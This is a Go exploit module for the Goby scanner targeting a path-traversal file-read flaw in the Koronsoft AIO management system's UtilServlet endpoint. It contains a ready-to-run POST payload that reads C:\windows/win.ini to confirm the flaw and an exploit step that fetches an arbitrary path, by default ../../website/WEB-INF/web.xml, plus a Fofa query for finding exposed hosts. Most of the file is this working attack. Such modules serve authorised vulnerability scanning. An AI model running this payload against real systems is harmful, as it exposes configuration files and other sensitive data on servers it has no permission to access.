package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "koronsoft AIO management system UtilServlet fileName File Read vulnerability",
    "Description": "<p>KoronsoftAIO management system is a very excellent enterprise management tool.</p><p>The UtilServlet file reading vulnerability of koronsoftAIO management system can be used to obtain sensitive information of the system.</p>",
    "Product": "koronsoft AIO management system",
    "Homepage": "http://www.koronsoft.com/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"changeAccount('8000')\"",
    "GobyQuery": "body=\"changeAccount('8000')\"",
    "Level": "2",
    "Impact": "<p>The UtilServlet file reading vulnerability ofkoronsoftAIO management system can be used to obtain sensitive information of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.koronsoft.com/\">http://www.koronsoft.com/</a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../website/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/UtilServlet",
                "follow_redirect": false,
                "header": {
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "operation=readErrorExcel&fileName=C:\\windows/win.ini"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "; for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/UtilServlet",
                "follow_redirect": false,
                "header": {
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "operation=readErrorExcel&fileName={{{filepath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<param-value>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]+)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "科荣 AIO 管理系统 UtilServlet 文件 fileName 参数文件读取漏洞",
            "Product": "科荣AIO管理系统",
            "Description": "<p>科荣AIO管理系统是一款十分优秀的企业管理工具。</p><p>科荣AIO管理系统 UtilServlet 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.koronsoft.com/\">http://www.koronsoft.com/</a><a href=\"http://www.91skzy.net\"></a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>科荣AIO管理系统 UtilServlet 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "koronsoft AIO management system UtilServlet fileName File Read vulnerability",
            "Product": "koronsoft AIO management system",
            "Description": "<p>KoronsoftAIO management system is a very excellent enterprise management tool.</p><p>The UtilServlet file reading vulnerability of koronsoftAIO management system can be used to obtain sensitive information of the system.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.koronsoft.com/\">http://www.koronsoft.com/</a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The UtilServlet file reading vulnerability ofkoronsoftAIO management system can be used to obtain sensitive information of the system.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10803"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
